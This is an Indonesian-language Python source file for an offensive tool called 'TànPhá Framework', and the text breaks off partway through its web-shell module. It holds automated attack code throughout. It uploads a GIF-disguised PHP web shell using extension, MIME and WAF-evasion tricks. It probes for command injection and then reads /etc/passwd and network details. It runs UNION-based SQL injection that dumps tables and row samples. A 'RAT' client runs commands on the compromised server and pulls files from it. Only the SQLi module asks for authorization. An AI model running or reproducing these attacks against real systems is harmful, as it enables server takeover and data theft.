import os
import sys
import requests
import random
import string
import time
import re
import secrets
import hashlib
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

def banner():
    print("=" * 55)
    print("         T à n P h á   F r a m e w o r k [Enterprise]      yam   ")
    print("       Modular CLI Penetration Testing & Auto-Attack     ")
    print("=" * 55)

def main_menu():
    while True:
        os.system('clear')
        banner()
        print("\n[ Menu Utama - Modul Enterprise Tersedia ]")
        print("  1. Advanced Arbitrary File Upload (Fully Automated)")
        print("  2. Command Injection Engine (Auto-Bypass & Enumeration)")
        print("  3. SQL Injection Scanner")
        print("  4. PHP2Shell Core Engine")
        print("  0. Keluar")
        
        choice = input("\n[?] Pilih opsi nomor: ").strip()
        
        if choice == '1':
            run_upload_module()
        elif choice == '2':
            run_cmd_injection_module()
        elif choice == '3':
            run_sqli_module()
        elif choice == '4':
            run_php2shell_module()
        elif choice == '0':
            print("\n[*] Keluar dari TànPhá. Stay safe, bre!")
            sys.exit(0)
        else:
            print("\n[!] Pilihan tidak valid, bro!")
            input("\nTekan Enter untuk coba lagi...")

def run_upload_module():
    print("-" * 60)
    print(" [ Modul: Enterprise Arbitrary File Upload & Polyglot Engine ]")
    print("-" * 60)
    target_url = input("[?] Masukkan URL target upload (contoh: http://target.com/upload.php): ").strip()
    
    common_fields = [
        "fileToUpload", "file", "uploaded_file", "img", "image", "pic", "picture",
        "media", "attachment", "file_data", "user_file", "profile_pic", "resume", "cv", "doc"
    ]
    
    extension_variants = [
        {"ext": ".php", "desc": "Standard PHP"},
        {"ext": ".php5", "desc": "PHP5 Extension"},
        {"ext": ".phtml", "desc": "PHTML Extension"},
        {"ext": ".phar", "desc": "PHAR Extension"},
        {"ext": ".Php", "desc": "Mixed Case .Php"},
        {"ext": ".php.jpg", "desc": "Double Ext .php.jpg"},
        {"ext": ".jpg.php", "desc": "Inverted Double Ext .jpg.php"}
    ]
    
    mime_variants = [
        "image/gif", "image/jpeg", "image/png", "application/octet-stream"
    ]
    
    base_url = target_url.rsplit('/', 1)[0]
    shell_signature = "TànPhá-Enterprise-Shell-Active"
    
    # POLYGLOT MAGIC BYTES SPOOFING (Bypass getimagesize() & exif validation)
    # Menggunakan header GIF89a di awal biner file agar server mengira ini file gambar sah
    cmd_var = "$_POST['cmd']"
    polyglot_payload = b"GIF89a;\n" + f"<?php echo '{shell_signature}'; @eval({cmd_var}); ?>".encode('utf-8')
    
    success = False
    verified_shell_url = ""
    
    print(f"\n[*] Memulai Polyglot Stealth Upload dengan Magic Bytes Spoofing...")
    
    for field in common_fields:
        if success: break
        for variant in extension_variants:
            if success: break
            for mime in mime_variants:
                rand_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
                p_name = f"shell_{rand_name}{variant['ext']}"
                
                print(f"[*] Testing -> Field: [{field}] | Bypass: {variant['desc']} | MIME: {mime}")
                
                # Menyiapkan custom multipart headers dengan boundary acak (Anti-Signature WAF)
                boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                custom_headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "X-Forwarded-For": "127.0.0.1"
                }
                
                files = {field: (p_name, polyglot_payload, mime)}
                
                try:
                    time.sleep(random.uniform(0.2, 0.6)) # Anti-IDS Rate Limiting Delay
                    
                    response = requests.post(target_url, files=files, timeout=6)
                    
                    if response.status_code in [200, 201, 302]:
                        detected_path = None
                        response_text = response.text
                        
                        path_matches = re.findall(r'(?:uploads|files|images|media|assets|content)/[a-zA-Z0-9_\-/]+\.[a-z]+', response_text)
                        if path_matches:
                            detected_path = base_url + "/" + path_matches[0]
                        
                        possible_dirs = [
                            detected_path,
                            base_url + "/uploads/" + p_name,
                            base_url + "/upload/" + p_name,
                            base_url + "/files/" + p_name,
                            base_url + "/assets/" + p_name,
                            base_url + "/" + p_name
                        ]
                        possible_dirs = [d for d in possible_dirs if d]

                        for check_url in possible_dirs:
                            check_url = check_url.replace(":/", "://") if "://" not in check_url else check_url
                            
                            try:
                                check_response = requests.get(check_url, timeout=4)
                                if shell_signature in check_response.text:
                                    print(f"\n[+] TARGET FILE UPLOAD BERHASIL DITEMBUS & DIVERIFIKASI!")
                                    print(f"    - Field Parameter : {field}")
                                    print(f"    - Teknik Bypass   : {variant['desc']} + Magic Bytes")
                                    print(f"    - Web Shell Aktif : {check_url}")
                                    verified_shell_url = check_url
                                    success = True
                                    break
                            except:
                                continue
                except Exception:
                    pass
                    
    # AUTO-INTERACTIVE SHELL DROP (Langsung masuk terminal eksekusi jika berhasil)
    if success:
        print("\n[***] MENGAKTIFKAN AUTO-INTERACTIVE SHELL SESSION [***]")
        print("[*] Sesi terhubung ke web shell target. Ketik perintah sistem atau 'exit' untuk keluar.\n")
        
        shell_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TànPhá-Polyglot-Engine"
        }
        
        while True:
            try:
                command = input("TànPhá-UploadShell# ").strip()
                if not command:
                    continue
                if command.lower() == 'exit':
                    print("[*] Keluar dari sesi interaktif web shell.")
                    break

                post_data = {"cmd": command}
                res = requests.post(verified_shell_url, data=post_data, headers=shell_headers, timeout=6)

                print("\n--- Output Eksekusi Target ---")
                print(res.text.replace(shell_signature, "").strip())
                print("-------------------------------\n")

            except KeyboardInterrupt:
                print("\n[*] Sesi dihentikan oleh pengguna.")
                break
            except Exception as e:
                print(f"[-] Gagal mengirim perintah ke shell: {e}")
    else:
        print("\n[-] Semua kombinasi Polyglot Upload & Magic Bytes telah diuji, target terproteksi ketat.")
        
    input("\nTekan Enter untuk kembali ke menu utama...")

def run_cmd_injection_module():
    print("-" * 60)
    print(" [ Modul: Automated Command Injection, WAF Bypass & Post-Exploitation ]")
    print("-" * 60)
    target_url = input("[?] Masukkan URL target (contoh: http://target.com/ping.php?ip=): ").strip()
    method = input("[?] Pilih Metode HTTP [GET / POST] (default: GET): ").strip().upper()
    if not method:
        method = "GET"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Forwarded-For": "127.0.0.1"
    }

    injection_payloads = [
        {"payload": "; id", "desc": "Semicolon Separator"},
        {"payload": "| id", "desc": "Pipe Separator"},
        {"payload": "&& id", "desc": "AND Operator"},
        {"payload": "\n id", "desc": "Newline Injection"},
        {"payload": "`id`", "desc": "Backticks Execution"},
        {"payload": "$(id)", "desc": "Command Substitution"},
        {"payload": ";uname -a", "desc": "Semicolon System Info"},
        {"payload": "|uname -a", "desc": "Pipe System Info"},
        {"payload": "& whoami", "desc": "Windows Ampersand"},
        {"payload": "| whoami", "desc": "Windows Pipe"}
    ]

    success = False
    vulnerable_url = target_url
    successful_payload = ""

    print(f"\n[*] Menguji {len(injection_payloads)} variasi payload Command Injection secara otonom via {method}...")

    for item in injection_payloads:
        # Menggunakan encoded_payload agar teknik URL Encoding & WAF Evasion berfungsi aktif
        encoded_payload = quote(item["payload"], safe='')
        
        if method == "POST":
            if "?" in target_url:
                base_u, param_str = target_url.split("?", 1)
                data_dict = {k: v[0] + item["payload"] for k, v in parse_qs(param_str).items()}
            else:
                base_u = target_url
                data_dict = {"ip": "127.0.0.1" + item["payload"]}
            test_url = base_u
            current_data = data_dict
        else:
            test_url = target_url + encoded_payload
            current_data = None

        print(f"[*] Testing metode: {item['desc']}")
        try:
            if method == "POST":
                response = requests.post(test_url, data=current_data, headers=headers, timeout=5)
            else:
                response = requests.get(test_url, headers=headers, timeout=5)

            indicators = ["uid=", "gid=", "root", "www-data", "nt authority", "system32", "linux"]
            html_lower = response.text.lower()

            if any(ind in html_lower for ind in indicators):
                print(f"\n[+] TARGET RENTAN COMMAND INJECTION!")
                print(f"    - Metode Sukses   : {item['desc']}")
                print(f"    - Payload Digunakan: {item['payload']}")
                print(f"    - Titik Injeksi   : {test_url}")
                success = True
                vulnerable_url = target_url
                successful_payload = item["payload"]
                break
            else:
                print("    [-] Respon server normal / parameter aman.")
        except Exception as e:
            print(f"    [-] Gagal terhubung: {e}")

    if success:
        print("\n[***] MENGAKTIFKAN POST-EXPLOIT & SYSTEM ENUMERATION ENGINE [***]")
        print("[*] Menjalankan serangkaian perintah otomatis untuk mengambil alih informasi sistem target...")

        extraction_commands = [
            {"cmd": "; uname -a", "desc": "Kernel & System Architecture"},
            {"cmd": "; id && whoami", "desc": "Privilege & User Identity"},
            {"cmd": "; cat /etc/passwd", "desc": "System Users Dump"},
            {"cmd": "; ifconfig || ip a", "desc": "Network Configuration"}
        ]

        for ex in extraction_commands:
            print(f"\n[*] Mengekstrak: {ex['desc']}...")
            custom_payload = ex["cmd"]
            encoded_ex_payload = quote(custom_payload, safe='')

            try:
                if method == "POST":
                    if "?" in vulnerable_url:
                        base_u, param_str = vulnerable_url.split("?", 1)
                        ex_data = {k: v[0] + custom_payload for k, v in parse_qs(param_str).items()}
                    else:
                        base_u = vulnerable_url
                        ex_data = {"ip": "127.0.0.1" + custom_payload}
                    ex_res = requests.post(base_u, data=ex_data, headers=headers, timeout=6)
                else:
                    ex_url = vulnerable_url + encoded_ex_payload
                    ex_res = requests.get(ex_url, headers=headers, timeout=6)

                print(f"    [+] Output Berhasil Ditangkap:")
                print(f"    --------------------------------------------------")
                output_lines = ex_res.text.strip().split("\n")
                for line in output_lines[:8]:
                    print(f"        {line}")
                print(f"    --------------------------------------------------")
            except Exception as e:
                print(f"    [-] Gagal mengekstrak modul ini: {e}")

        print(f"\n[+] Post-Exploitation selesai! Akses sistem sepenuhnya terekspos.")
    else:
        print("\n[-] Target tidak merespon payload Command Injection atau aman dari eksekusi sistem.")

    input("\nTekan Enter untuk kembali ke menu utama...")

def run_sqli_module():
    # --- Konfigurasi & Batas Enumerasi ---
    MAX_TABLES_ENUM = 10
    MAX_COLS_PER_TABLE = 15
    MAX_ROWS_PER_COL = 3

    WAF_SIGNATURES = {
        "Cloudflare": {
            "headers": {"server": "cloudflare", "cf-ray": None},
            "cookies": ["__cfduid", "cf_clearance", "__cf_bm"],
            "body": ["cloudflare ray id", "attention required! | cloudflare"],
        },
        "Sucuri": {
            "headers": {"x-sucuri-id": None, "x-sucuri-cache": None},
            "cookies": [],
            "body": ["sucuri website firewall", "access denied - sucuri"],
        },
        "AWS WAF": {
            "headers": {"x-amzn-requestid": None, "x-amzn-errortype": None},
            "cookies": [],
            "body": ["request blocked", "aws waf"],
        },
        "Imperva/Incapsula": {
            "headers": {"x-iinfo": None, "x-cdn": "incapsula"},
            "cookies": ["incap_ses_", "visid_incap_"],
            "body": ["incapsula incident id"],
        },
        "F5 BIG-IP": {
            "headers": {"server": "big-ip"},
            "cookies": ["bigipserver", "tsxxxx"],
            "body": [],
        },
        "Akamai": {
            "headers": {"server": "akamaighost", "x-akamai-transformed": None},
            "cookies": ["ak_bmsc"],
            "body": ["access denied", "reference #"],
        },
        "ModSecurity": {
            "headers": {"server": "apache"},
            "cookies": [],
            "body": ["modsecurity", "not acceptable!", "406 not acceptable"],
        },
        "Wordfence": {
            "headers": {},
            "cookies": ["wfvt_"],
            "body": ["wordfence", "generated by wordfence"],
        },
        "FortiWeb": {
            "headers": {"server": "fortiweb"},
            "cookies": ["fortiweb"],
            "body": ["fortiweb"],
        },
        "Barracuda": {
            "headers": {},
            "cookies": ["barra_counter_session", "bnii_"],
            "body": ["barracuda"],
        },
        "DDoS-Guard": {
            "headers": {"server": "ddos-guard"},
            "cookies": ["__ddg"],
            "body": ["ddos-guard"],
        },
        "Generic Block": {
            "headers": {},
            "cookies": [],
            "body": [
                "access denied", "request blocked", "forbidden",
                "web application firewall", "your request has been blocked",
            ],
        },
    }

    def _empty_result():
        return {
            "vuln": False, "exploitable": False, "type": "sqli",
            "dbms": "Unknown", "url": None, "method": None, "param": None,
            "columns": 0, "matched_payload": "", "extracted_data": None,
            "tables": [], "table_columns": {}, "sample_data": {}, "waf": None,
        }

    def _confirm_scope(url):
        host = (urlparse(url).hostname or "").lower()
        local_hosts = {"localhost", "127.0.0.1", "::1", "0.0.0.0"}
        if host in local_hosts or host.endswith((".local", ".test", ".lab", ".ctf", ".internal")):
            return True
        print(f"[!] Target bukan localhost ({host}).")
        print("[!] Gunakan HANYA pada sistem milikmu atau yang punya izin tertulis.")
        return input("    Ketik 'AUTHORIZED' untuk melanjutkan: ").strip() == "AUTHORIZED"

    def _fingerprint(text):
        normalized = re.sub(r"\s+", "", text or "")[:2000]
        return hashlib.md5(normalized.encode("utf-8", errors="ignore")).hexdigest()

    def _build_get_url(base_url, param, payload):
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        if not qs:
            return None
        injected = False
        new_qs = []
        for k, v in qs:
            if not injected and k == param:
                new_qs.append((k, v + payload))
                injected = True
            else:
                new_qs.append((k, v))
        if not injected:
            return None
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _send(session, method, base_url, param, payload, headers, timeout=6):
        try:
            if method == "POST":
                return session.post(
                    base_url, data={param: "1" + payload}, headers=headers,
                    timeout=timeout, allow_redirects=False, verify=False
                )
            target = _build_get_url(base_url, param, payload)
            if not target:
                return None
            return session.get(
                target, headers=headers,
                timeout=timeout, allow_redirects=False, verify=False
            )
        except Exception:
            return None

    def _is_error_page(text):
        low = (text or "").lower()
        markers = [
            "unknown column", "unknown column in 'order clause'",
            "out of range", "sql syntax", "you have an error in your sql syntax",
            "unclosed quotation mark", "unterminated string", "pg_query()",
            "microsoft sql server", "odbc sql server driver",
            "sqlite3.operationalerror", "sqlite.exception",
        ]
        return any(m in low for m in markers)

    def _detect_dbms(text):
        low = (text or "").lower()
        mapping = {
            "MySQL": [
                "sql syntax", "mysql_fetch", "you have an error in your sql syntax",
                "warning: mysql", "extractvalue", "updatexml", "~5.7", "~8.0",
            ],
            "PostgreSQL": ["pg_query()", "postgresql", "syntax error at or near", "unterminated string"],
            "MSSQL": ["odbc sql server driver", "microsoft sql server", "unclosed quotation mark"],
            "SQLite": ["sqlite3.operationalerror", "sqlite.exception"],
        }
        for db, errs in mapping.items():
            if any(e in low for e in errs):
                return db
        return "Unknown"

    def _wrap_marker(dbms, marker, expr):
        if dbms == "SQLite":
            return f"'~{marker}~' || ({expr}) || '~{marker}~'"
        return f"CONCAT('~{marker}~', ({expr}), '~{marker}~')"

    def _union_extract(session, method, base_url, param, headers,
                       dbms, string_col, col_count, expr, timeout=8, delay_mul=1.0):
        time.sleep(random.uniform(0.3, 0.6) * delay_mul)
        marker = "TPX" + secrets.token_hex(6) + "X"
        wrapped = _wrap_marker(dbms, marker, expr)
        cols = ["null"] * col_count
        cols[string_col - 1] = wrapped
        payload = f"' UNION SELECT {', '.join(cols)}-- "
        res = _send(session, method, base_url, param, payload, headers, timeout=timeout)
        if not res or res.status_code in (301, 302, 303, 307, 308):
            return None
        pattern = re.compile(
            r"~" + re.escape(marker) + r"~(.*?)~" + re.escape(marker) + r"~",
            re.DOTALL,
        )
        m = pattern.search(res.text)
        return m.group(1).strip() if m else None

    def detect_waf(session, url, headers, timeout=6):
        try:
            r = session.get(url, headers=headers, timeout=timeout,
                            allow_redirects=False, verify=False)
        except Exception as e:
            return {
                "waf": None, "all_detected": [], "evidence": [f"unreachable: {e}"],
                "delay_multiplier": 1.0, "status": None,
            }

        hdr = {k.lower(): v.lower() for k, v in r.headers.items()}
        cookie_hdr = r.headers.get("Set-Cookie", "").lower()
        body = (r.text or "").lower()[:20000]

        evidence = []
        detected = []

        for name, sig in WAF_SIGNATURES.items():
            hit = False
            for h, expected in sig.get("headers", {}).items():
                if h in hdr:
                    if expected is None or expected in hdr[h]:
                        evidence.append(f"{name}: header '{h}'")
                        hit = True
            for c in sig.get("cookies", []):
                if c in cookie_hdr:
                    evidence.append(f"{name}: cookie '{c}'")
                    hit = True
            for b in sig.get("body", []):
                if b in body:
                    evidence.append(f"{name}: body '{b}'")
                    hit = True
            if hit and name not in detected:
                detected.append(name)

        if r.status_code in (403, 406, 429, 503) and not detected:
            detected.append("Unknown WAF")

        primary = detected[0] if detected else None
        multiplier = 2.0 if primary else (1.5 if r.status_code in (403, 406, 429) else 1.0)

        return {
            "waf": primary,
            "all_detected": detected,
            "evidence": evidence[:6],
            "delay_multiplier": multiplier,
            "status": r.status_code,
        }

    # --- Eksekusi Utama Modul ---
    print("-" * 60)
    print(" [ Modul: SQL Injection Multi-DBMS Auto-Exploit & WAF Bypass Engine ]")
    print("-" * 60)

    target_url = input("[?] Masukkan URL target: ").strip()
    if not target_url.startswith(("http://", "https://")):
        print("[-] URL harus diawali http:// atau https://")
        input("\nTekan Enter untuk kembali...")
        return _empty_result()

    if not _confirm_scope(target_url):
        print("[-] Otorisasi tidak dikonfirmasi.")
        input("\nTekan Enter untuk kembali...")
        return _empty_result()

    method = input("[?] Metode HTTP [GET/POST] (default GET): ").strip().upper() or "GET"

    parsed = urlparse(target_url)
    url_params = [k for k, _ in parse_qsl(parsed.query, keep_blank_values=True)]

    if method == "GET":
        if not url_params:
            print("[-] URL tidak punya parameter GET (contoh ?id=1).")
            input("\nTekan Enter untuk kembali...")
            return _empty_result()
        default_param = url_params[-1]
        param = input(f"[?] Parameter GET (default: {default_param}): ").strip() or default_param
        if param not in url_params:
            print(f"[-] Parameter '{param}' tidak ditemukan.")
            input("\nTekan Enter untuk kembali...")
            return _empty_result()
    else:
        param = input("[?] Parameter POST (default: id): ").strip() or "id"

    session = requests.Session()
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        ]),
        "X-Forwarded-For": "127.0.0.1",
        "Client-IP": "127.0.0.1",
    }

    # WAF Fingerprint Check
    print("[*] Melakukan WAF Fingerprinting...")
    waf_info = detect_waf(session, target_url, headers)
    delay_mul = waf_info["delay_multiplier"]
    if waf_info["waf"]:
        print(f"[!] WAF Terdeteksi: {waf_info['waf']} (Delay Multiplier: {delay_mul}x)")
    else:
        print("[+] Tidak ada WAF komersial kentara yang terdeteksi.")

    # Baseline
    print("[*] Ambil baseline...")
    try:
        if method == "POST":
            base_res = session.post(target_url, data={param: "1"}, headers=headers,
                                   timeout=6, allow_redirects=False, verify=False)
        else:
            base_res = session.get(target_url, headers=headers,
                                   timeout=6, allow_redirects=False, verify=False)
    except Exception as e:
        print(f"[-] Gagal terhubung: {e}")
        session.close()
        input("\nTekan Enter untuk kembali...")
        return _empty_result()

    if base_res.status_code in (301, 302, 303, 307, 308):
        print("[-] Baseline redirect. Pakai URL final setelah redirect.")
        session.close()
        input("\nTekan Enter untuk kembali...")
        return _empty_result()

    baseline_hash = _fingerprint(base_res.text)
    baseline_len = len(base_res.text)
    baseline_has_errors = _is_error_page(base_res.text)

    # Deteksi rentan
    sqli_payloads = [
        {"payload": "'", "desc": "Single Quote Error Check"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- ", "desc": "MySQL Error (ExtractValue)"},
        {"payload": "' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)-- ", "desc": "MySQL Error (UpdateXML)"},
        {"payload": "' AND 1=CAST(version() AS INTEGER)-- ", "desc": "PostgreSQL Error (Cast)"},
        {"payload": "' AND 1=CONVERT(INT, @@version)-- ", "desc": "MSSQL Error (Convert)"},
    ]

    success = False
    detected_dbms = "Unknown"
    matched_payload = ""

    print(f"\n[*] Uji {len(sqli_payloads)} payload SQLi...")
    for item in sqli_payloads:
        time.sleep(random.uniform(0.3, 0.7) * delay_mul)
        print(f"[*] {item['desc']}")
        r = _send(session, method, target_url, param, item["payload"], headers)
        if r is None:
            print("    [-] Request gagal.")
            continue
        if r.status_code in (301, 302, 303, 307, 308):
            print("    [-] Redirect (WAF/auth).")
            continue
        if _fingerprint(r.text) == baseline_hash:
            print("    [-] Sama dengan baseline.")
            continue
        db = _detect_dbms(r.text)
        if db != "Unknown" and not baseline_has_errors:
            print(f"\n[+] RENTAN! DBMS: {db} | {item['desc']}")
            success = True
            detected_dbms = db
            matched_payload = item["payload"]
            break
        print("    [-] Tidak ada signature DBMS.")

    if not success:
        print("\n[-] Target tidak menunjukkan tanda rentan.")
        session.close()
        input("\nTekan Enter untuk kembali...")
        res_dict = _empty_result()
        res_dict.update({"url": target_url, "method": method, "param": param, "waf": waf_info["waf"]})
        return res_dict

    # Column enumeration
    print(f"\n[***] COLUMN PROBING ({detected_dbms}) [***]")
    col_count = 0
    for i in range(1, 16):
        time.sleep(random.uniform(0.2, 0.4) * delay_mul)
        r = _send(session, method, target_url, param, f"' ORDER BY {i}-- ", headers, timeout=5)
        if r is None or r.status_code in (301, 302, 303, 307, 308):
            break
        if _is_error_page(r.text):
            break
        if abs(len(r.text) - baseline_len) > max(300, baseline_len // 5):
            break
        col_count = i
    print(f"[+] Kolom: {col_count}")

    if col_count == 0:
        session.close()
        input("\nTekan Enter untuk kembali...")
        res_dict = _empty_result()
        res_dict.update({
            "vuln": True, "exploitable": False, "dbms": detected_dbms,
            "url": target_url, "method": method, "param": param,
            "columns": 0, "matched_payload": matched_payload, "waf": waf_info["waf"],
        })
        return res_dict

    # Cari kolom string
    print("[*] Cari kolom string...")
    string_col = None
    token = "T" + secrets.token_hex(4)
    for c in range(1, col_count + 1):
        time.sleep(random.uniform(0.15, 0.3) * delay_mul)
        test = ["null"] * col_count
        test[c - 1] = f"'{token}'"
        r = _send(session, method, target_url, param,
                  f"' UNION SELECT {', '.join(test)}-- ", headers, timeout=5)
        if r and token in r.text:
            string_col = c
            print(f"    [+] Kolom string: {c}")
            break

    extracted_data = None
    tables = []
    table_columns = {}
    sample_data = {}

    if string_col is not None:
        version_func = "@@version"
        if detected_dbms == "PostgreSQL":
            version_func = "version()"
        elif detected_dbms == "SQLite":
            version_func = "sqlite_version()"
        time.sleep(0.3 * delay_mul)
        extracted_data = _union_extract(
            session, method, target_url, param, headers,
            detected_dbms, string_col, col_count, f"({version_func})", delay_mul=delay_mul
        )
        if extracted_data:
            print(f"\n[+] DBMS Version: {extracted_data}")

        # Helper internal untuk enumerasi tabel & kolom
        def _list_tables():
            if detected_dbms == "MySQL":
                expr = ("(SELECT GROUP_CONCAT(table_name SEPARATOR 0x0a) "
                        "FROM information_schema.tables WHERE table_schema=database())")
            elif detected_dbms == "PostgreSQL":
                expr = ("(SELECT string_agg(table_name, chr(10)) FROM information_schema.tables "
                        "WHERE table_schema NOT IN ('pg_catalog','information_schema'))")
            elif detected_dbms == "MSSQL":
                expr = ("(SELECT STRING_AGG(table_name, CHAR(10)) FROM information_schema.tables "
                        "WHERE table_type='BASE TABLE')")
            elif detected_dbms == "SQLite":
                expr = ("(SELECT GROUP_CONCAT(name, char(10)) FROM sqlite_master "
                        "WHERE type='table' AND name NOT LIKE 'sqlite_%')")
            else:
                return []
            res = _union_extract(session, method, target_url, param, headers, detected_dbms, string_col, col_count, expr, delay_mul=delay_mul)
            return [t.strip() for t in res.split("\n") if t.strip()][:MAX_TABLES_ENUM] if res else []

        def _list_columns(table):
            if detected_dbms == "MySQL":
                tbl = "0x" + table.encode().hex()
                expr = (f"(SELECT GROUP_CONCAT(column_name SEPARATOR 0x0a) "
                        f"FROM information_schema.columns "
                        f"WHERE table_name={tbl} AND table_schema=database())")
            elif detected_dbms == "PostgreSQL":
                tbl = "'" + table.replace("'", "''") + "'"
                expr = (f"(SELECT string_agg(column_name, chr(10)) FROM information_schema.columns "
                        f"WHERE table_name={tbl})")
            elif detected_dbms == "MSSQL":
                tbl = "'" + table.replace("'", "''") + "'"
                expr = (f"(SELECT STRING_AGG(column_name, CHAR(10)) FROM information_schema.columns "
                        f"WHERE table_name={tbl})")
            elif detected_dbms == "SQLite":
                tbl = "'" + table.replace("'", "''") + "'"
                expr = f"(SELECT GROUP_CONCAT(name, char(10)) FROM pragma_table_info({tbl}))"
            else:
                return []
            res = _union_extract(session, method, target_url, param, headers, detected_dbms, string_col, col_count, expr, delay_mul=delay_mul)
            return [c.strip() for c in res.split("\n") if c.strip()][:MAX_COLS_PER_TABLE] if res else []

        def _sample_column(table, column, limit=MAX_ROWS_PER_COL):
            if detected_dbms == "MySQL":
                expr = (f"(SELECT GROUP_CONCAT(v SEPARATOR 0x0a) FROM "
                        f"(SELECT `{column}` AS v FROM `{table}` LIMIT {limit}) t)")
            elif detected_dbms == "PostgreSQL":
                expr = (f"(SELECT string_agg(v::text, chr(10)) FROM "
                        f"(SELECT {column} AS v FROM {table} LIMIT {limit}) t)")
            elif detected_dbms == "MSSQL":
                expr = (f"(SELECT STRING_AGG(CAST(v AS VARCHAR(MAX)), CHAR(10)) FROM "
                        f"(SELECT TOP {limit} {column} AS v FROM {table}) t)")
            elif detected_dbms == "SQLite":
                expr = (f"(SELECT GROUP_CONCAT(v, char(10)) FROM "
                        f"(SELECT {column} AS v FROM {table} LIMIT {limit}) t)")
            else:
                return []
            res = _union_extract(session, method, target_url, param, headers, detected_dbms, string_col, col_count, expr, delay_mul=delay_mul)
            return [v.strip() for v  in res.split("\n") if v.strip()] if res else []

        print("\n[***] TABEL ENUMERATION [***]")
        tables = _list_tables()
        if tables:
            print(f"[+] {len(tables)} tabel ditemukan:")
            for t in tables:
                print(f"    - {t}")
        else:
            print("[-] Tidak ada tabel yang bisa di-enumerate.")

        for table in tables:
            time.sleep(random.uniform(0.3, 0.6) * delay_mul)
            cols_list = _list_columns(table)
            if not cols_list:
                continue
            table_columns[table] = cols_list
            print(f"    [{table}] kolom: {', '.join(cols_list[:10])}")

            for column in cols_list[:2]:
                time.sleep(random.uniform(0.3, 0.6) * delay_mul)
                values = _sample_column(table, column)
                if values:
                    sample_data.setdefault(table, {})[column] = values
                    print(f"        .{column} = {values}")

    session.close()
    input("\nTekan Enter untuk kembali ke menu utama...")

    return {
        "vuln": True,
        "exploitable": extracted_data is not None,
        "type": "sqli",
        "dbms": detected_dbms,
        "url": target_url,
        "method": method,
        "param": param,
        "columns": col_count,
        "matched_payload": matched_payload,
        "extracted_data": extracted_data,
        "tables": tables,
        "table_columns": table_columns,
        "sample_data": sample_data,
        "waf": waf_info["waf"],
    }

def run_php2shell_module():
    print("-" * 60)
    print(" [ Modul: PHP2Shell Enterprise Core & Stateful Command Engine ]")
    print("-" * 60)
    print("[*] Engine tingkat lanjut dengan Stateful CD, Output Sanitizer, & Built-in Tools.")
    
    shell_url = input("[?] Masukkan URL Web Shell aktif (contoh: http://target.com/uploads/shell.php): ").strip()
    password_param = input("[?] Masukkan parameter POST eksekusi (default: cmd): ").strip()
    if not password_param:
        password_param = "cmd"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TànPhá-Enterprise-RAT"
    }

    # Menyimpan state direktori aktif secara otonom (Stateful Directory Tracking)
    current_dir = ""
    try:
        init_res = requests.post(shell_url, data={password_param: "pwd"}, headers=headers, timeout=5)
        current_dir = init_res.text.strip().split("\n")[-1]
    except:
        current_dir = "/app"

    print(f"\n[+] Sesi PHP2Shell Berhasil Dikunci ke Target!")
    print(f"[*] Ketik perintah sistem, gunakan 'cd <path>' untuk berpindah folder,")
    print(f"    atau gunakan built-in command: [sysinfo, upload <local>, download <remote>, exit]\n")

    while True:
        try:
            prompt_path = current_dir if current_dir else "shell"
            command = input(f"TànPhá-RAT:{prompt_path}# ").strip()
            if not command:
                continue
            
            lower_cmd = command.lower()

            if lower_cmd == 'exit':
                print("[*] Keluar dari sesi PHP2Shell.")
                break

            # 1. Built-in Command: SYSINFO (Ringkasan instan sistem target)
            if lower_cmd == 'sysinfo':
                sys_payload = "uname -a; id; whoami; hostname; ifconfig || ip a"
                res = requests.post(shell_url, data={password_param: sys_payload}, headers=headers, timeout=6)
                print("\n--- Target System Information ---")
                print(res.text.strip())
                print("-" * 35 + "\n")
                continue


            # 2. Built-in Command: DOWNLOAD <remote_file>
            if lower_cmd.startswith('download '):
                r_file = command.split(' ', 1)[1].strip()
                print(f"[*] Mengunduh file dari target: {r_file}...")
                dl_payload = f"base64 {r_file}" if os.name != 'nt' else f"certutil -encode {r_file} stdout"
                res = requests.post(shell_url, data={password_param: dl_payload}, headers=headers, timeout=8)
                
                if res.status_code == 200 and len(res.text.strip()) > 0:
                    local_out = os.path.basename(r_file)
                    try:
                        import base64
                        # Membersihkan output base64 dari sisa teks server
                        clean_b64 = "".join([line for line in res.text.strip().split("\n") if not line.startswith("<?")])
                        decoded_data = base64.b64decode(clean_b64)
                        with open(local_out, "wb") as f_out:
                            f_out.write(decoded_data)
                        print(f"[+] Berhasil mengunduh! Disimpan secara lokal sebagai: {local_out}\n")
                    except Exception as e:
                        print(f"[-] Gagal mendekode file download: {e}\n")
                else:
                    print("[-] Gagal mengambil file atau file tidak ditemukan di target.\n")
                continue

            # 3. Built-in Command: UPLOAD <local_file>
            if lower_cmd.startswith('upload '):
                parts = command.split(' ', 1)
                if len(parts) < 2:
                    print("[-] Format salah! Gunakan: upload <nama_file_lokal>\n")
                    continue
                l_file = parts[1].strip()
                if not os.path.exists(l_file):
                    print(f"[-] File lokal '{l_file}' tidak ditemukan!\n")
                    continue

                print(f"[*] Mengunggah file lokal '{l_file}' ke server target...")
                try:
                    import base64
                    with open(l_file, "rb") as f_in:
